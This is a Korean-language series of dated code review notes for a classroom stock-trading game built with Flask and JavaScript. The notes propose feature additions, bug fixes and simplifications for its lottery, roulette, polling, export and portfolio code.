- **Chart.js 인스턴스 미정리로 인한 메모리 누수** (`app.js:1032`, `app.js:398-403`): `S.portChart`, `S.assetLineChart` 등은 `loadPortfolio()` 재호출 시 `destroy()` 가드가 있지만, `showScreen()` 또는 `goHome()`으로 화면을 전환할 때는 cleanup 없이 방치됨. `showLanding()` 내에서 `[S.portChart, S.assetLineChart, S.hostBarChart, S.resultsBarChart].forEach(c => c?.destroy())` 한 줄 추가만으로 해결 가능.

- **시간 포맷 함수 중복 구현** (`app.js:569-581`, `app.js:583-604`): 타이머(`startTimer`), 진행자 타이머, 결과 화면 등에서 `mm:ss` 포맷을 `String(m).padStart(2,'0')` 패턴으로 반복 구현. `function fmtMSS(sec){ const m=Math.floor(sec/60),s=sec%60; return \`${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}\`; }` 유틸 함수 하나로 통합하면 약 10줄 이상의 중복 코드 제거 가능.

---

## 2026-06-14 (4차)

### 추가하면 좋을 기능

- **복권 참여자 제출 현황 진행자에게 실시간 표시** (`app.py:798-812`, `index.html:704-708`): 진행자의 `lhost-picking-section`은 "참가자 번호 선택 중..."과 남은 시간만 표시하고, 실제로 몇 명이 번호를 제출했는지 전혀 알 수 없음. `GET /api/rooms/<rid>/lottery` 응답(`app.py:808` 직전)에 `picks_count: len(cur.get('picks', {}))` 필드를 추가하고, 진행자 패널에 "X/Y명 제출" 카운터를 표시하면 진행자가 "이제 추첨해도 되겠다"를 스스로 판단 가능. 3초 폴링이 이미 동작 중이므로 서버 1줄 + 클라이언트 1줄 추가만으로 구현 가능.

- **룰렛 스핀 애니메이션 중 오버레이 강제 닫기 방지** (`app.js:947`, `app.js:993-995`): `doRouletteSpin()`이 `await new Promise(r => setTimeout(r, 4300))`로 4.3초를 대기하는 동안 사용자가 오버레이 배경을 탭하면 `roulette-overlay`가 닫히고, 이후 `rlt-result` / `rlt-again-btn` DOM 조작이 숨겨진 요소에서 발생해 결과가 화면에 나타나지 않음. `closeRoulette()` 첫 줄에 `if (_rltSpinning) return;` 한 줄만 추가하면 방지 가능. 기존에 `_rltSpinning` 플래그가 이미 있으므로 별도 상태 추가 불필요.

- **해외 주식 원화 환산 기준 배지 및 국가 구분** (`stock_service.py:78-97`, `app.js:1148-1165`): 해외 주식 15개(Apple 270,000원, NVIDIA 160,000원 등)가 국내 종목과 동일한 카드 레이아웃으로 표시되어 학생들이 "이게 실제 달러 가격인가요?"라는 혼란이 발생할 수 있음. `renderGrid()` 내에서 `st.sector`가 `'해외IT'`, `'해외반도체'`, `'전기차'`, `'일본'`, `'중국IT'` 중 하나이면 종목명 앞에 국기 이모지(🇺🇸/🇯🇵/🇨🇳)를 추가하거나, 카드 우측 하단에 `<span style="font-size:9px;color:var(--muted)">KRW환산</span>` 배지를 붙이면 서버 변경 없이 교육적 명확성 향상.

- **복권 추첨 타이머 만료 자동 처리 서버 독립성 부재** (`app.py:789-795`): `picking → drawing` 전이와 `drawing → revealed` 전이가 모두 `GET /api/rooms/<rid>/lottery` 폴링 요청 처리 중 타임스탬프 비교로 발생함. 진행자·참여자가 모두 탭을 닫거나 네트워크가 끊기면 타이머가 만료돼도 상태 전이가 일어나지 않아 복권이 `drawing` 상태로 영구 정지됨. 다음 접속 때 폴링이 재시작되면 자동 복구되지만, 이 동안 새로 접속한 학생은 복권이 진행 중인지 알 수 없음. `lottery_start()` (`app.py:778`) 시점에 `threading.Timer(LOTTO_PICK_SECS + LOTTO_DRAW_SECS + 5, lambda: _auto_close(rid, cur_round))`를 등록하는 방식으로 서버 독립 자동 마감 구현 권장.

- **20개 이상 섹터 나열로 인한 섹터 필터 UX 저하** (`app.js:1097-1102`, `stock_service.py:99`): 최근 해외 주식 15개 추가로 섹터 수가 `반도체`, `IT`, `자동차`, `배터리`, `바이오`, `제약`, `금융`, `통신`, `전자`, `철강`, `해운`, `에너지`, `엔터`, `게임`, `건설`, `지주`, `해외IT`, `해외반도체`, `전기차`, `일본`, `중국IT` 등 20여 개에 달함. 현재 `renderSectors()`는 이를 한 줄 가로 스크롤로 나열해 모바일 화면에서 탐색이 매우 불편함. 국내/해외를 먼저 탭으로 분류하거나, 섹터 선택을 드롭다운(`<select>`)으로 대체하면 화면 공간을 절약하면서 탐색이 빨라짐.

- **`lottery_start()` 상금 최대값 검증 없음** (`app.py:769`): `prize = float(d.get('prize', 0))`에 상한선이 없음. 진행자가 입력 실수로 `500000000`(5억)을 입력하면 6개 번호 모두 맞춘 학생에게 5억이 지급되어 게임 밸런스가 무너짐. `if prize > room.starting_cash * RoomMember.query.filter_by(room_id=rid).count(): return jsonify({'error': '상금이 너무 큽니다'}), 400` 형태의 상한선 또는 `index.html:691`의 입력 필드에 `max` 속성 추가 권장.

---

### 제거/단순화할 것들

- **`RLT_SEGS` 상수 — 완전한 dead code** (`app.js:816-822`): `const RLT_SEGS = [{label:'꽝',...}, ...]` 7줄이 선언되어 있지만 `openRouletteModal()`, `doRouletteSpin()`, `updateRltLegend()`, `updateRltWheel()` 어디서도 이 변수를 참조하지 않음. 스핀 결과의 회전 각도는 서버 응답 `data.seg_start/data.seg_end`를 직접 사용하고(`app.js:937`), 범례는 `data.multipliers/data.weights`를 사용함. 룰렛 배율 진행자 설정 기능 추가 시 이 상수가 남겨진 것으로 보이며 완전히 삭제 가능.

- **`_lots[rid]['done']`이 Python `set` — JSON 직렬화 불호환** (`app.py:71`, `app.py:108-109`): `_lots.setdefault(rid, {}).setdefault('done', set()).add(cur['round'])` 패턴에서 `done` 값이 Python `set`임. `json.dumps(_lots)`를 호출하면 `TypeError: Object of type set is not JSON serializable`가 발생함. 현재 코드에서 이 딕셔너리를 직접 직렬화하지 않아 문제가 없지만, 로깅·디버깅 또는 향후 캐시 직렬화 시 즉시 폭발. `_lots[rid] = {'done': []}` 초기화로 통일하고 중복 추가는 `if round_n not in done: done.append(round_n)` 패턴으로 교체 권장.

- **`_showLotParticipantPicker()` 매 3초 그리드 45개 버튼 재렌더링** (`app.js:1980-2003`, `app.js:1823`): `picking` 상태 60초 동안 3초 폴링으로 최대 20회 `_renderLotGrid('lottery-picker-grid', _lotParticipantPicks, ...)` 호출 → 매번 45개 버튼 DOM을 삭제 후 재생성. `app.js:1982-1985`에 이미 `overlay.style.display === 'flex' && picker-section이 표시 중`이면 `_lotCountdown()` 업데이트만 하고 조기 반환하는 로직이 있지만, 그 블록 밖에서도 `_renderLotGrid()` 호출이 남아 있음 (`app.js:1994`). `_lotPickerSubmitted`이거나 그리드에 이미 버튼이 있으면 카운트다운만 업데이트하고 그리드 재렌더링은 건너뛰도록 조건 추가 필요.

- **`loadParticipantRankings()` 매 호출마다 스피너로 목록 초기화** (`app.js:1528-1529`): 순위 탭이 열린 상태에서 5초 폴링마다 `list.innerHTML = '<div class="loading-center"><span class="spinner"></span></div>'`로 기존 내용을 스피너로 덮어씌워 목록이 깜빡임. `loadHostMembers()`처럼 데이터를 먼저 받아온 뒤 조용히 갱신하거나, `if (!list.children.length)` 조건으로 초기 로딩 시에만 스피너를 표시하면 깜빡임 없이 부드러운 업데이트 가능.

- **`host_adjust()` `user_id` 누락 시 불필요한 DB 쿼리 실행** (`app.py:374-378`): `target_uid = d.get('user_id')`가 JSON에 없으면 `None`이 되고, `RoomMember.query.filter_by(room_id=rid, user_id=None).first()`는 `WHERE user_id IS NULL`로 번역되어 의미 없는 쿼리가 실행됨. 결과가 None이면 404로 처리되므로 최종 동작은 맞지만, `if not target_uid: return jsonify({'error': 'user_id 필요'}), 400`으로 조기 반환하면 DB 쿼리를 줄이고 오류 원인도 명확해짐.

- **`_renderLotGrid()` `onclick="${clickFn.name}(this,${i})"` 함수명 문자열 의존** (`app.js:1938`): `clickFn.name` 프로퍼티를 onclick 속성값으로 직접 삽입함. 향후 빌드 도구로 코드를 minify하면 함수가 `a`, `b` 등으로 축소되어 `onclick="a(this,1)"` 같은 형태가 되어 전역 함수 탐색 실패. 이벤트 위임으로 교체(`container.addEventListener('click', e => { const btn = e.target.closest('.lottery-num'); if (btn) clickFn(btn, parseInt(btn.textContent)); })`)하면 minify에 안전하고 45개 이벤트 리스너 대신 1개로 절약 가능.

- **`lottery_draw()` 에서 서버가 당첨 번호 중복을 허용** (`app.py:851-856`): `raw = (request.json or {}).get('numbers', [])`로 받은 번호를 `sorted(set(int(n) for n in raw if 1 <= int(n) <= 45))`로 정제하지만, 진행자가 의도적으로 중복 번호를 제출하면 `set()`으로 중복이 제거된 뒤 `len(nums) != 6` 체크에서 실패해 오류가 반환됨. 문제없으나 `lottery_pick()`(`app.py:830`)도 동일 패턴으로 두 곳의 검증 로직이 복사-붙여넣기 수준으로 동일. 공통 헬퍼 `def _parse_lotto_numbers(raw)` 함수로 추출하면 중복 제거와 유지보수 편의.

---

## 2026-06-15

### 추가하면 좋을 기능

- **[긴급] PostgreSQL URL 자동 수정 누락** (`app.py:13`): Render 무료 티어가 제공하는 `DATABASE_URL` 환경 변수는 `postgres://...` 형식이지만, SQLAlchemy 1.4+는 `postgresql://`만 인식해 `OperationalError: Could not parse rfc1738 URL`로 서버 시작 자체가 실패함. `sqlite:///game.db` 기본값 사용 시에는 숨겨지지만 PostgreSQL로 전환하는 순간 즉시 터짐. `db_url = os.environ.get('DATABASE_URL', 'sqlite:///game.db'); db_url = db_url.replace('postgres://', 'postgresql://', 1); app.config['SQLALCHEMY_DATABASE_URI'] = db_url` 3줄 수정으로 해결.

- **시장 카드에 보유 종목 표시 없음** (`app.js:1147-1165`, `stock_service.py:36-97`): 학생이 이미 보유한 종목이 시장 그리드에서 다른 종목과 동일하게 표시되어 추가 매수 또는 매도 결정을 위해 매번 포트폴리오 탭을 왔다 갔다 해야 함. `loadMarket()` 성공 시 `GET /api/rooms/<rid>/portfolio`의 `holdings` 배열을 심볼 Set으로 변환해 `S.heldSymbols`에 캐싱하고, `renderGrid()` 내 카드 생성 시 `S.heldSymbols.has(st.symbol)`이면 카드 테두리 색상을 `var(--accent)` 또는 좌측에 `<span class="chip chip-blue">보유</span>` 배지를 붙이면 서버 변경 없이 클라이언트만 수정해 즉시 구현 가능.

- **진행자 수업 중 공지 브로드캐스트 기능 없음** (`app.py:470-481`, `index.html:114-145`): 게임 진행 중 교사가 학생 전원에게 "지금 IT 섹터 뉴스를 주목하세요!" 같은 안내를 전달할 방법이 없음. `POST /api/rooms/<rid>/host/announce` 엔드포인트를 추가해 최신 공지를 `StockService` 인스턴스(또는 `Room` 모델의 `announcement` 컬럼)에 저장하고, 참여자 폴링 응답(`get_room()`)에 `announcement` 필드를 포함해 변경 시 폭탄뉴스 팝업과 동일한 UI로 표시하면 수업 소통 도구로 즉시 활용 가능.

- **관심종목(watchlist)이 방 ID와 무관하게 전역 저장** (`app.js:17`): `localStorage.getItem('watchlist')`로 저장하므로, 같은 브라우저에서 다른 수업(다른 방)에 참여하면 이전 수업의 관심종목이 그대로 남아 있음. `localStorage.getItem(\`watchlist-${S.room?.id || 'default'}\`)` 형태로 방 ID를 키에 포함시키면 방별로 독립된 관심종목 유지 가능. `app.js:17`, `app.js:1137`, `app.js:1138` 세 줄 수정으로 해결.

- **게임 도중 참여자 실시간 접속 상태 표시 없음** (`app.py:421-425`, `index.html:146-155`): 진행자 순위 화면에서 어떤 학생이 지금 앱을 열고 있는지 알 수 없음. `RoomMember`에 `last_seen = db.Column(db.DateTime, nullable=True)` 컬럼을 추가하고 `get_rankings()` 또는 `get_portfolio()` 호출 시 갱신. 진행자 순위 목록에서 `last_seen`이 3분 이내이면 🟢, 이상이면 ⚫를 표시하면 교사가 이탈 학생을 즉시 파악 가능 (`app.py:330` `result.append()` 시 `last_seen` 포함, `app.js:385` 렌더링에 아이콘 추가).

- **참여자 이탈 후 재진입 시 방 코드 재입력 필요** (`app.js:2106-2127`, `app.py:214-223`): 학생이 실수로 브라우저를 새로고침하거나 뒤로가기를 누르면 로딩 화면으로 돌아가 방 코드·학번·이름을 다시 입력해야 함. `enterParticipantGame()` 시작 시 `sessionStorage.setItem('lastRoom', S.room.id)`로 방 ID를 저장하고, `window.onload`(`app.js:2106`) 초기화 시 `sessionStorage`의 방 ID가 있으면 `GET /api/auth/me` → `active_room`으로 자동 복원하면 새로고침 후에도 게임 화면이 유지됨. (`sessionStorage`는 탭 닫기 시 자동 삭제되므로 `localStorage`보다 안전.)

---

### 제거/단순화할 것들

- **`StockService._init_prices()` TTL 즉시 만료 초기화** (`stock_service.py:120-122`): `self._prices[sym] = (now - self._price_ttl, start)` 패턴으로 모든 종목의 타임스탬프를 이미 만료된 상태로 초기화함. 학생 30명이 게임 시작 후 동시에 시장 탭을 로드하면 첫 번째 `get_price()` 호출에서 전체 45개 종목 가격이 일제히 재계산되는 thundering herd가 발생. `(now, start)`로 교체하면 초기 가격이 `price_ttl`(기본 20초) 동안 안정적으로 유지되고 첫 로드 시 부하가 분산됨.

- **`_lot_round_due()` 일시정지 상태에서 복권 알림 오작동** (`app.py:76-85`): 함수 시작 시 `if room.status != 'active': return None` 체크가 있지만 (`app.py:77`), 일시정지 상태는 `room.status == 'paused'`이므로 `!= 'active'`에 해당해 `None`을 반환함 — 이 부분은 올바름. 그러나 `room_dict()` 내 `lottery_round_due` 계산(`app.py:168`)에서 `_lot_round_due(room, remaining, total_s)`가 호출될 때, 일시정지 중 `remaining`은 `(end_time - paused_at)`로 계산되어 경과 비율이 고정됨. 따라서 복권 알림이 `picking` 상태로 진입하지 않아도 진행자 화면에 "복권 추첨 시간" 알림바가 남아 있는 것처럼 보일 수 있음. `_lot_round_due()` 내 `room.status` 체크를 `if room.status not in ('active',): return None`으로 명시적으로 제한해 의도를 분명히 할 것.

- **`app.js:17` `S` 객체 초기화에 `watchlist` 로드가 인라인으로 포함** (`app.js:17`): `new Set(JSON.parse(localStorage.getItem('watchlist') || '[]'))` 파싱이 `S` 객체 리터럴 내부에 있어, `localStorage`에 손상된 JSON이 있으면 `JSON.parse` 예외가 발생해 `S` 전체 초기화가 실패하고 이후 모든 전역 상태가 `undefined`가 됨. `let watchlistRaw = []; try { watchlistRaw = JSON.parse(localStorage.getItem('watchlist') || '[]'); } catch(e) {}` 방어 코드를 `S` 선언 직전에 추가하고 `S.watchlist = new Set(watchlistRaw)`로 분리하면 손상된 캐시로 인한 전체 앱 오류를 방지.

- **`app.py:637-655` 예금 이자 계산에 UTC vs 로컬 시간 불일치** (`app.py:639`, `app.py:642`): `get_deposits()`에서 `now = datetime.utcnow()`로 현재 시간을 계산하고 `held = (now - d.created_at).total_seconds()`로 보유 시간을 구함. `d.created_at`은 `datetime.utcnow()` 기본값(`models.py:88`)이므로 일관성은 있지만, `create_deposit()` 응답(`app.py:676`)에서는 `remaining = (room.end_time - datetime.utcnow()).total_seconds()`로 예상 이자를 계산함. 예금 직후 이 두 값이 동일한 방향으로 계산되지만, `room.end_time`이 일시정지로 인해 연장된 경우(`resume_room()`: `app.py:304`) `get_deposits()`의 `total_seconds`는 `room.duration_minutes * 60`으로 고정되어 실제 연장된 게임 시간이 반영되지 않음. `total_seconds = max(room.duration_minutes * 60, (room.end_time - room.start_time).total_seconds())` 처럼 실제 게임 총 시간으로 계산하면 정확성 향상.

- **`app.py:146-170` `room_dict()` 매 호출 시 `RoomMember.query.filter_by().count()` 실행** (`app.py:165`): `'member_count': RoomMember.query.filter_by(room_id=room.id).count()`가 `room_dict()` 호출마다 COUNT 쿼리를 실행함. `get_room()`, `create_room()`, `join_room()`, `start_room()`, `end_room()` 등 방 상태를 반환하는 모든 엔드포인트가 이를 호출해 사용자 수만큼 COUNT 쿼리가 중복 발생. `Room` 모델에 `member_count = db.Column(db.Integer, default=0)` 컬럼을 추가하고 `join_room()` / `kick_member()` 시 `+1/-1` 증감 업데이트하거나, SQLAlchemy `lazy='dynamic'` + `count()` 대신 relationship backref로 미리 로드하면 쿼리 1회 절약.

- **`submit_quiz()` `room.status` 미확인으로 게임 종료 후 현금 변경 가능** (`app.py:917-947`): `get_quiz()`는 `room.status != 'active'` 체크가 있어 (`app.py:905`) 종료 후 퀴즈 질문을 받을 수 없지만, `submit_quiz()`는 해당 체크가 없음. 학생이 퀴즈를 열어 둔 채 게임이 종료되면 `_quiz_state`의 `qid`가 남아 있어 게임 종료 후에도 답안을 제출해 `RoomMember.cash`가 변경될 수 있음 (종료 직후 포트폴리오 결산 전 또는 후에 따라 Excel 결과가 달라질 수 있음). `app.py:921` 직후에 `if room.status != 'active': return jsonify({'error': '게임이 종료되었습니다'}), 400` 체크를 추가하면 즉시 방지.

---

## 2026-06-16

### 오늘 수정된 버그 (참고)

- **복권 입력 창 미표시** (`app.js:586-598`): 복권 시작 시 게임이 자동 일시정지(`room.status = 'paused'`)되는데, `lottery_active` 체크가 `else` 블록(게임 활성 시에만 실행) 안에 있어 참여자 화면에서 복권 폴링이 시작되지 않았음. `lottery_active` 체크를 `if(paused)/else` 분기 바깥으로 이동해 해결.

- **복권 결과 창 반복 표시 / 룰렛 미표시** (`app.js:1816-1821`, `app.js:586`): 결과 창을 닫으면 `_lotResultShown = false`로 리셋되어 방 폴링이 복권 폴링을 즉시 재시작 → 결과 창이 무한 반복 표시. 이 루프가 화면을 점유해 룰렛도 표시 불가. `_lotResultShown` 대신 `_lotResultRound`(회차 번호)를 추적하고 같은 회차이면 재시작하지 않도록 수정, 서버에 `lottery_current_round` 필드 추가.

---

### 추가하면 좋을 기능

- **복권 번호 선택 중 오버레이 강제 닫기 가능** (`app.js:2102-2106`, `index.html:495`): 참여자가 번호 선택 중 `closeLotteryOverlay()`를 호출(닫기 버튼 또는 브라우저 뒤로가기)하면 `_stopLotPolling()`이 실행되어 이후 결과를 영원히 볼 수 없음. `_lotResultRound`로 결과 재표시는 차단되고, 복권 폴링도 멈춘 상태라 당첨 여부를 확인할 방법이 없어짐. 'picking' · 'drawing' 상태일 때는 닫기 버튼을 `display:none`으로 숨기고 `closeLotteryOverlay()`에 `if (d.state === 'picking' || d.state === 'drawing') return;` 가드를 추가하면 실수 닫기 방지.

- **복권 상금 출처 미처리** (`app.py:789-794`, `app.py:99-105`): `lottery_start()`에서 `prize`를 받아 `_lots[rid]['current']['prize']`에 저장하지만 진행자 또는 방 공동 자금에서 차감하지 않음. `_do_reveal()`에서 당첨자에게 현금이 지급되므로 상금 총액만큼 시스템 외부에서 돈이 생성됨. 수업용으로는 큰 문제가 없으나, `RoomMember` 전체 `cash` 합계가 게임 시작 시보다 늘어나 정확한 수익률 분석을 방해함. 진행자의 `RoomMember.cash`에서 `prize`를 차감하거나, `Room`에 `prize_pool` 컬럼을 두어 별도 관리 권장.

- **복권 참여자 미제출 시 피드백 없음** (`app.py:87-105`, `app.js:2033-2041`): 번호를 제출하지 않은 참여자가 `drawing` 상태에서 대기 화면으로 전환되면 `lottery-my-submitted` 요소에 아무것도 표시되지 않음 (`_lotParticipantPicks.length > 0` 조건 실패). 미제출 참여자에게 "번호를 제출하지 않았습니다" 문구를 명시적으로 보여주면 혼란 방지. `app.js:2038` 조건을 `else` 분기로 확장하면 됨.

- **복권 회차 번호 자동 지정 없음** (`app.py:779`, `app.js:1895`): `lottery_start()`의 `round_n = int(d.get('round', 1))`은 클라이언트가 보낸 값을 그대로 신뢰. 진행자가 1회차를 건너뛰고 2회차부터 시작하거나 같은 회차를 두 번 시작해도 서버에서 검증하지 않음 (`_lots[rid]['done']` Set에 없으면 통과). 서버 측에서 `done` Set의 최대값 + 1을 자동으로 `round_n`으로 계산하고 클라이언트 입력을 무시하면 회차 조작 방지.

- **룰렛 미니게임 시간 만료 후 스핀 버튼 잠금 없음** (`app.py:729-735`, `app.js:919-936`): `minigame_spin()`은 서버에서 `remaining > total_s * 0.05`이면 400 오류를 반환하지만, 룰렛 오버레이는 한 번 열리면 게임 종료 후에도 열려 있을 수 있음. 게임 종료 시 `stopPolling()` 후 `showScreen('screen-results')`로 이동하는데, 룰렛 오버레이가 `position:fixed`로 위에 떠 있으면 결과 화면 뒤에서 클릭을 가로막음. `stopPolling()` 호출 시 `document.getElementById('roulette-overlay').style.display = 'none'`을 함께 실행하면 안전.

---

### 제거/단순화할 것들

- **`closeLotteryResultModal()` 불필요한 래퍼 함수** (`app.js:2108-2110`): `closeLotteryResultModal()`이 `closeModal('modal-lottery-result')` 한 줄만 호출. 기존에는 `_lotResultShown = false` 리셋 로직이 있었으나 오늘 수정으로 제거됨. HTML(`index.html:733`)에서 `onclick="closeModal('modal-lottery-start')"` 패턴과 동일하게 `onclick="closeModal('modal-lottery-result')"` 직접 호출로 단순화하고 래퍼 삭제 가능.

- **`lottery-notify-bar` 인라인 스타일에 `display:none` 중복** (`index.html:133`): `style="display:none;background:...;display:none;align-items:center;..."` 에서 `display:none`이 두 번 선언됨. CSS 파서가 마지막 선언을 사용하므로 결과적으로는 정상 동작하지만, `showLotteryNotifyBar()`에서 `bar.style.display = 'flex'`로 바꿀 때 두 번째 `display:none`이 이미 인라인 파싱 시 덮어쓰여 있어 혼동 유발. 첫 번째 `display:none` 하나만 남기고 삭제.

- **`_checkLotteryStatus`에서 `_stopLotPolling()` 후 즉시 `_showLotteryResult` 호출** (`app.js:1853-1855`): 'revealed' 상태 감지 시 폴링을 멈추고 결과를 표시하는 흐름은 올바르나, `_stopLotPolling()`이 `_lotCountdownTimer`도 함께 초기화(`clearInterval`)하므로 이후 `_showLotteryResult` 내 `clearInterval(_lotCountdownTimer)` 호출(`app.js:2045`)이 중복 실행됨. 큰 문제는 없으나 `_showLotteryResult` 내 `clearInterval` 제거로 단순화 가능.

- **`_startLotPolling()`에서 즉시 호출과 인터벌 중복** (`app.js:1822-1826`): `_checkLotteryStatus(rid)`를 즉시 한 번 호출한 뒤 3초 인터벌을 시작함. 즉시 호출이 완료되기 전에 인터벌 첫 번째 실행이 3초 후 따라오므로 서버 응답 지연 시 두 요청이 겹칠 가능성이 있음. `_lotPollInterval`을 1초 딜레이 후 시작하거나 즉시 호출을 `await`로 기다린 뒤 인터벌 등록 (`_checkLotteryStatus(rid).then(() => { _lotPollInterval = setInterval(...) })`)하면 중복 방지.

- **`_lots` 딕셔너리에서 완료된 복권 데이터 영구 보존** (`app.py:71`, `app.py:109`): `_do_reveal()` 호출 시 `cur['state'] = 'revealed'`로만 변경하고 `_lots[rid]['current']`를 `None`으로 초기화하지 않음. 게임 종료 후에도 메모리에 남아 `lottery_active`가 'revealed' 상태를 반환 계속. `cleanup_room_service()`(`app.py:64-68`) 호출 시 `_lots.pop(rid, None)`을 함께 실행하면 게임 종료 시 복권 데이터가 메모리에서 정리됨.

---

## 2026-06-16 (2차)

### 추가하면 좋을 기능

- **주식 거래 수수료 설정 기능** (`app.py:252-258`, `models.py:25-38`): 방 생성 시 매수/매도 수수료율(0~1%)을 설정하면 "수수료가 투자 수익에 미치는 영향" 개념을 체험 가능. `Room`에 `trade_fee_pct = db.Column(db.Float, default=0.0)` 컬럼 추가 → `trade()` 내 `app.py:539~543`에서 매수 시 `amount *= (1 + room.trade_fee_pct / 100)`, 매도 시 `amount *= (1 - room.trade_fee_pct / 100)` 적용 → `RoomTransaction.note`에 수수료 금액 기록. 방 생성 폼(`index.html:62-75`)과 `doCreateRoom()`(`app.js:124`)에 입력란 1개 추가로 50줄 내 완성.

- **시나리오 예약 이벤트 (교사 사전 설정)** (`app.py:1017-1032`): 교사가 게임 시작 전 특정 경과 시점(예: "전체 시간의 40% 경과 시 배터리 섹터 -20%")에 자동 발동할 이벤트를 등록하는 `POST /api/rooms/<rid>/host/schedule-event` 엔드포인트 추가. `_scheduled_events: dict[int, list]` 인메모리 구조로 저장하고, `room_dict()`(`app.py:159`) 내 경과 비율 계산 시 해당 이벤트를 트리거. 교사가 수업 흐름에 맞춰 주가 충격을 미리 계획해 수업 진행이 매끄러워지며, `force_sector_event()` 기존 로직을 재사용하므로 추가 구현량이 적음.

- **결과 화면에 개인 거래내역 조회** (`index.html:587-625`, `app.js:1568-1649`): 게임 종료 후 `screen-results`에서 자신의 매수/매도 기록을 볼 방법이 없음. `loadResults()` 내 `app.js:1568` 직후에 `GET /api/rooms/<rid>/transactions?page=1` 결과를 "내 거래 내역 펼치기" 토글 섹션으로 추가하면, 게임 사후 "왜 이 종목을 선택했나요?" 토론에서 학생이 자신의 타이밍·종목을 데이터와 함께 발표 가능. 서버 변경 없이 클라이언트만 수정.

- **Excel 내보내기에 전체 학생 거래내역 시트 추가** (`app.py:1078-1147`): 현재 엑셀은 최종 순위 시트 1개만 생성. `app.py:1140` 직후에 `ws2 = wb.create_sheet('거래내역')`를 만들고 `RoomTransaction.query.filter_by(room_id=rid).order_by(RoomTransaction.user_id, RoomTransaction.timestamp).all()` 결과를 [학번, 이름, 종목, 매수/매도, 수량, 단가, 금액, 시각] 컬럼으로 기록하면 교사가 사후 학생별 투자 패턴을 분석 가능. 약 30줄 추가로 구현 완료.

- **포트폴리오 전량 청산 원클릭 버튼** (`index.html:378-395`, `app.js:1324-1435`): 게임 종료 직전 보유 종목을 하나씩 매도해야 해서 현금화가 번거로움. 포트폴리오 탭 상단 "보유 종목" 제목 옆에 "전체 매도" 버튼을 추가하고, `for...of` + `await execTrade('SELL', h.symbol, h.shares)` 루프로 순차 처리하면 됨. 실패한 종목은 toast로 알리고 나머지는 계속 진행하는 방식으로 partial 케이스 처리.

- **진행자 화면에서 폭탄뉴스 팝업 비표시** (`app.js:725-737`, `app.js:1029-1056`): `startNewsPolling()`은 진행자·참여자 구분 없이 동일하게 `showBombNews()`를 호출해 진행자도 팝업을 받음. 진행자는 자신이 뉴스를 발송하는 주체이므로 팝업이 불필요하고 대시보드 시야를 가림. `startNewsPolling()` 내 `app.js:734`에 `if (S.room?.is_host) return;` 조건 한 줄만 추가하면 진행자에게만 팝업을 숨길 수 있음.

---

### 제거/단순화할 것들

- **[중요 버그] `export_rankings()` 게임 종료 후 새 StockService 가격으로 자산 계산** (`app.py:1078`, `app.py:35-46`, `stock_service.py:304-312`): `_end_room()`이 `cleanup_room_service(room.id)`를 호출해 서비스를 삭제(`app.py:68`)하면, 이후 교사가 엑셀 다운로드 시 `member_total_value()` 내 `get_room_service(rid)`(`stock_service.py:308-311`)가 새 인스턴스를 생성해 완전히 다른 무작위 가격으로 보유 주식 평가액을 계산함. 결과 화면에 표시된 순위와 Excel 순위가 다를 수 있음. 해결책: `_end_room()` 내 `cleanup_room_service()` 호출 직전에 `for h in RoomHolding.query.filter_by(room_id=room.id): m = RoomMember.query.filter_by(room_id=room.id, user_id=h.user_id).first(); price = svc.get_price(h.symbol) or h.avg_price; m.cash += price * h.shares; db.session.delete(h)` 루프로 주식을 현재가에 일괄 청산하면 StockService 없이도 정확한 최종 자산 산출 가능.

- **참여자 1명당 분당 최대 36회 폴링 요청 폭주** (`app.js:577-604`, `app.js:725-737`, `app.js:676-694`): 참여자 게임 화면에서 `S.pollInterval` (5초, `GET /rooms/<rid>`) + `S.newsInterval` (3초, `GET /rooms/<rid>/news`) + `refreshMyRank()` (5초마다, `GET /rooms/<rid>/rankings`) 세 가지 폴링이 독립 실행돼 학생 1명당 분당 최대 36회 요청 발생. 참여자 30명이면 분당 1,080회로 Render 무료 티어에 과부하. `GET /rooms/<rid>` 응답에 `{ status, remaining_seconds, news: {...}, my_rank, my_total_value, lottery_active }` 필드를 통합 포함해 3개 폴링을 1개로 줄이면 분당 360회 (3× 감소). 서버 `get_room()` 라우트 1곳 수정 + 클라이언트 폴링 통합으로 완결.

- **`startTimer()` 클라이언트 로컬 시간 기반으로 타이머 오차 발생 가능** (`app.js:697-717`): `rem = Math.floor((new Date(S.room.end_time) - new Date()) / 1000)` 계산이 학생 기기의 로컬 시계에 의존. 기기 시계가 서버와 3분 차이 나면 타이머가 실제보다 3분 일찍/늦게 "00:00"이 되어 혼란 유발(실제 게임 종료는 서버 기준으로 정상 처리됨). `S.room.remaining_seconds`(서버가 계산한 값)를 기준으로 매 초 -1 카운트다운하고, `pollInterval` 응답으로 `remaining_seconds`를 교정하는 방식으로 전환하면 시계 오차와 무관하게 정확한 타이머 표시 가능 (`app.js:710`의 `new Date()` 계산 제거).

- **`api.del()` HTTP 오류 응답 미처리** (`app.js:34`): 2026-06-14에 `api.get()`·`api.post()`의 동일 문제를 지적했으나 `api.del()`은 언급되지 않음. `(await fetch(url, {method:'DELETE'})).json()` 그대로 반환해 서버 500 시 `SyntaxError`로 UI 조용히 중단. `doWithdraw()`(`app.js:1530`)·`doKickMember()`(`app.js:208`)가 이를 사용. `api.get`/`api.post` 수정 패치 시 `api.del`도 동일하게 `const r = await fetch(url, {method:'DELETE'}); if (!r.ok) return {error: \`HTTP \${r.status}\`}; return r.json();` 패턴으로 함께 수정하면 세 함수를 일관성 있게 보호 가능.

- **`openStockModal()` 매번 포트폴리오 API 호출** (`app.js:1212-1224`): 학생이 종목 카드를 탭할 때마다 `GET /api/rooms/<rid>/portfolio`를 실행해 현금 잔액과 보유 수량을 가져옴. 종목 모달을 빠르게 여닫으며 여러 종목을 비교하는 경우 매 탭마다 API 요청이 발생. `S` 상태에 `portfolioCache: {cash, holdingsMap, updatedAt}` 필드를 추가하고 10초 이내면 캐시를 재사용하면 요청 수를 크게 줄일 수 있음. `execTrade()` 성공 시(`app.js:1292-1322`) 캐시의 `cash`와 `holdingsMap`을 로컬 갱신하면 API 없이도 모달 내 현금·보유 수량이 즉시 반영됨.

